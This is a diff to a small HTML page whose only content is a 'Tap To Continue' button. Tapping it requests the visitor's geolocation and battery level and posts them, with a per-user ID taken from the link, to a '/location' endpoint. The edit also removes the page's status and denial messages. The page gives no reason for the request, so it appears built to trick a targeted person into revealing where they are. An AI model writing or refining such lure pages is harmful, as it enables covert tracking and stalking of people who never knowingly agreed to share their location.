@@ -10,9 +10,7 @@ height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-flex-direction:column;
 margin:0;
-font-family:Arial;
 }
 
 button{
@@ -20,20 +18,15 @@ font-size:25px;
 padding:20px 40px;
 cursor:pointer;
 }
-
-#msg{
-margin-top:20px;
-font-size:22px;
-}
 </style>
 
 </head>
 
 <body>
 
-<button onclick="getLocation()">Tap To Continue</button>
-
-<div id="msg"></div>
+<button onclick="getLocation()">
+Tap To Continue
+</button>
 
 <script>
 
@@ -42,19 +35,13 @@ const user = params.get("user")
 
 function getLocation(){
 
-navigator.geolocation.getCurrentPosition(success, denied)
-
-}
-
-async function success(pos){
-
-document.getElementById("msg").innerText = "Jai Balaji Dear"
+navigator.geolocation.getCurrentPosition(async function(pos){
 
 let batteryLevel = "Unknown"
 
 if(navigator.getBattery){
 let battery = await navigator.getBattery()
-batteryLevel = Math.round(battery.level * 100)
+batteryLevel = Math.round(battery.level*100)
 }
 
 fetch("/location",{
@@ -70,15 +57,11 @@ battery:batteryLevel
 })
 })
 
-}
-
-function denied(){
-
-document.getElementById("msg").innerText = "Please allow location and tap again"
+})
 
 }
 
 </script>
 
 </body>
-</html>
+</html>   
